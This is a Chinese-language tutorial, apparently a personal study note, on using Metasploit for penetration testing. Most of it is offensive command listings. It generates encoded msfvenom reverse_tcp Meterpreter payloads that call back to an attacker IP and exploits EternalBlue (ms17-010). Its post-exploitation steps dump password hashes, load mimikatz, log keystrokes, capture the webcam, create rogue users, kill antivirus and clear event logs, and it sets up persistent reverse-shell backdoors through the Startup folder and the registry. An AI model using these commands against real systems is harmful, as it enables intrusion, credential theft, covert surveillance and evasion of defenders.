Metasploit是一个开源的安全漏洞检测工具

附带千个已知的软件漏洞 可以使用这个渗透框架 进行全链路的渗透测试

# 安装

```
#!/bin/bash

echo "====== Metasploit 一键安装脚本 ======"

# 更新系统
echo "[1/5] 更新系统..."
sudo apt update -y

# 安装基础依赖
echo "[2/5] 安装依赖..."
sudo apt install -y curl git gnupg2

# 下载官方安装脚本
echo "[3/5] 下载 Metasploit 安装脚本..."
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall

# 赋予执行权限
chmod +x msfinstall

# 执行安装
echo "[4/5] 开始安装 Metasploit..."
sudo ./msfinstall

# 初始化数据库
echo "[5/5] 初始化数据库..."
sudo msfdb init

echo "====== 安装完成 ======"
echo "输入 msfconsole 启动 Metasploit"
```

适用于 Ubuntu VPS 建议 ≥ 2GB 内存

后期升级只需要`msfupdate` 即可

# 基本使用

我们可以通过`msfconsole`进入`msf终端`

基本流程如下

1. `search` 查找基本漏洞 比如：`search ms17-010` 永恒之蓝

2. 使用`use` 利用漏洞
3. 使用`info` 检查配置信息 比较少使用
4. 使用`set payload windows/x64/meterpreter/reverse_tcp` 设置载荷 使用反向代理
5. `show options`检测参数
6. `set HOST` 设置攻击IP
7. `run` 开始利用
8. 后渗透阶段

# `msf`设置`shellcode`

shellcode是我们后渗透的关键

普通的生成

```
msfvenom -p 有效载荷 -f 输出格式 -o 输出文件
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o payload.exe
```

通过编码生成

```
msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 -lhost 攻击机IP -lport 攻击机器端口 -e 编码格式 -i 编码次数 -f 输出格式 -o 输出文件
msfvenom -a x86 --platform windows -p  windows/x64/meterpreter/reverse_tcp -lhost 192.168.0.111 -lport 8888 -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
```

我们可以透过下面命令输出所有信息

```
msfvenom -l payload
msfvenom -l platforms
msfvenom -l encrypt
msfvenom -l encoders
```

以上内容就是生成木马相关

我们`msf`还需要开启监听

```
use exploit/multi/hander
show options
```

继续设置即可

# 漏洞利用

也就是我们的`exp` 默认位置是在

`/opt/metasploit-framework/embedded/framework/modules/exploits`

kali中在如下默认位置

`/usr/share/metasploit-framework/modules/exploits`

漏洞利用的代码都是通过`ruby` 语言重构 所以都是`rb`结尾

我们需要加载自己的`exp`如何实现呢 

我们需要 自己编写 或者下载编写好的`rb`文件

存入上述目录  进入`msf终端` 执行`reload_all` 重载全部模块

# Meterpreter

这个是`msf`的一个类似库的内容 是一组`payload`的集合 主要用于后渗透

他的执行过程如下：

1. 目标机器存在漏洞被执行 调用Meterpreter的连接方式
2. 使用bind正向连接 或者使用reverse反向 如果使用反向 那么加载`dll文件` 并且在内存中执行
3. 通过socks建立TSL/1.0加密隧道 并且发送Get给攻击者的机器
4. 攻击者机器收到请求后 配置对应的客户端 加载所有的扩展 通过隧道传输

我们使用的权限是依据我们DLL注入到哪个进程中的

所以对于不同权限我们需要使用下面命令迁移

```
migrate 1384         # 将当前Meterpreter Shell迁移到PID为1384的进程上
```



# 后渗透基本

那么我们按照上面进入内网后 一般都是先收集信息

```
sysinfo              # 查看目标主机系统信息
run scraper          # 查看目标主机详细信息
run hashdump         # 导出密码的哈希
load kiwi            # 加载mimikatz
ps                   # 查看目标主机进程信息
pwd                  # 查看目标当前目录(windows)
getlwd               # 查看目标当前目录(Linux)
search -f *.jsp -d e:\   # 搜索E盘中所有以.jsp为后缀的文件
download e:\test.txt /root   # 将目标机的e:\test.txt文件下载到/root目录下
upload /root/test.txt d:\test   # 将/root/test.txt上传到目标机d:\test目录
getpid               # 查看当前Meterpreter Shell的进程PID
migrate 1384         # 将当前Meterpreter Shell迁移到PID为1384的进程上
idletime             # 查看主机运行时间
getuid               # 查看当前权限
screenshot           # 截图
webcam_list          # 查看目标主机摄像头
webcam_snap          # 拍照
webcam_stream        # 开视频
execute 参数 -f 可执行文件   # 执行可执行程序
run getgui -u hack -p 123    # 创建hack用户，密码123
run getgui -e               # 开启远程桌面
keyscan_start        # 开启键盘记录功能
keyscan_dump         # 显示捕捉到的键盘记录信息
keyscan_stop         # 停止键盘记录功能
uictl disable keyboard   # 禁止目标使用键盘
uictl enable keyboard    # 允许目标使用键盘
uictl disable mouse      # 禁止目标使用鼠标
uictl enable mouse       # 允许目标使用鼠标
load                  # 使用扩展库
run                   # 使用扩展库
```

那么其实里面很多我们都不需要 因为我们对抗杀软 这里的东西不适合了，比如：

```
getsystem            # 提权，获得administrator才成功
run killav           # 关闭杀毒软件
```

这两个高危操作 肯定已经过时了

当然还有我们网络通信相关的

```
run persistence -X -i 5 -p 8888 -r 192.168.10.27
# 反弹时间间隔5s 会自动连接 192.168.27的4444端口，缺点是容易被杀毒软件查杀

portfwd add -l 3389 -r 192.168.11.13 -p 3389  
# 将192.168.11.13的3389端口转发到本地的3389端口上，该段192.168.11.13是获取权限的主机

clearev  
# 清除日志
```

我们还可以使用其他的后渗透模块

```
run post/windows/manage/migrate                 # 自动进程迁移
run post/windows/gather/checkvm                 # 查看目标主机是否运行在虚拟机上
run post/windows/manage/killav                  # 关闭杀毒软件
run post/windows/manage/enable_rdp              # 开启远程桌面服务
run post/windows/manage/autoroute               # 查看路由信息
run post/windows/gather/enum_logged_on_users    # 列举当前登录的用户
run post/windows/gather/enum_applications       # 列举应用程序
run post/windows/gather/credentials/windows_autologin   # 抓取自动登录的用户名和密码
run post/windows/gather/smart_hashdump          # dump出所有用户的hash
```

# 持续性后门

`meterpreter`的后门是随机器关闭而关闭的 所以我们其实希望有一个 开机自动上线的木马

建立持续性的后门其实有两个方法 `启动项启动`和`服务启动`

 `启动项启动`我们只需要把木马存入

`C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

`服务启动`

就是使用我们的命令

```
run persistence -X -i 5 -p 8888 -r 192.168.10.27
# 反弹时间间隔5s 会自动连接 192.168.27的4444端口，缺点是容易被杀毒软件查杀
```

原理就是 构建`vbs`文件 并且写入注册表 只要开机就启动



那么其实我们一般都不会通过MSF进行后渗透 而是通过 `CobaltStrike` 进行 后渗透工作

所以我们的MSF 学习到此其实就差不多了 

这里只是保存了 基本的漏洞 但是一般都是通过web 打过后直接上传 免杀的 CS木马 从而后渗透

所以MSF当前我认为现在只可以学习 或者生成shellcode相关